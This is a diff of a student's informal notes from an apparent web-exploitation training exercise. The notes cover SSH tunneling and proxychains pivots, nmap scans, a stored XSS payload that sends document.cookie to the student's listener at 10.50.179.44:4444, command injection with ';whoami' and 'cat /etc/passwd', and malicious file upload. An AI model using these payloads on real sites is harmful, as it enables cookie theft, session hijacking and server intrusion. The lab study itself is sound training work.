@@ -1,5 +1,5 @@
 First day, day one! Let's get this started, I can type with out looking at the keyboard. Oops I missed spelled without, like why is it just one word. 
-
+Linux op station: 10.50.179.44
 Getting on to
 ssh demo1@10.50.15.172 -L 1111:10.208.50.61:80 for Challenges???
                                         .42   
@@ -78,7 +78,7 @@ GET requests can be ultlized to pass data to the server with this:         http:
                                                                                             OP NOTES
 ssh demo1@10.50.15.172 -L 9999:10.208.50.42:80
 
-stored XXS, open a listning port nc -lv 4444
+stored XXS, open a listning port nc -lvnk 4444
 on site:
 <script>document.location="http://10.50.179.44:4444/?username=" + document.cookie;</script>      capture cookies
                                                                   document.body.innerHTML          capture sensitive data
@@ -92,24 +92,43 @@ In order to Malicoius file upload we need
   2. know where we are uploading to
   3. be able to get there to run commands on shell created
 
+                                                                                      
+                                                              Sinerio  
+Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)
+Objective: Maneuver through network, identify and gain access to Minstry of Industry web servers.
+Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Web exploitation techniques limited to 
+cross-site scripting, command injection, file upload, and path transversal. Network scanning tools/technique usage is at the discretion of student.
+Scenario Credentials: FLAG = W3B3xpl01t5t@rt0F@ct1v1ty
+Prior Approvals: Development of SSH access on host: Donovian_MI_websvr. Upon identification of additional Minstry web sites, student is authorized browse to pages to collect intellegence to enable answering CTFd challenges.
 
+Scheme of Maneuver:
+>Jump Box
+->T1:10.100.28.40
 
+Target Section:
 
+T1
+Hostname: Donovian_MI_websvr
+IP: 10.100.28.40
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Conduct approved Web Exploitation techniques to collect intellegence.
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+                                                OP notes
+>ssh -MS /tmp/jump student@10.50.16.164
+>ssh -S /tmp/jump jump -O forward -D9050
+>proxychains nmap -sT -T4 10.100.28.40                80/tcp   open  http    Good
+                                                      4444/tcp open  krb524  SSH
+>nc the ports
+>ssh -S /tmp/jump jump -O forward -L 1111:10.100.28.40:80 -L 1112:10.100.28.40:4444
+>proxychains nmap --script=http-enum 192.168.28.100
+/robots.txt ## net_test   then a page with bars to send pings to             >>> >>> >>> >>> >>> >>> >>> Path to test ;whoami then>> cat /etc/passwd (can access linux thru here)
+/css/       ## pictues of differrent sizes, and 2 files full of characters 
+/images/    ## russian images
+/uploads/   ##this is the cyber swareness training and the location of its ip
 
 
 
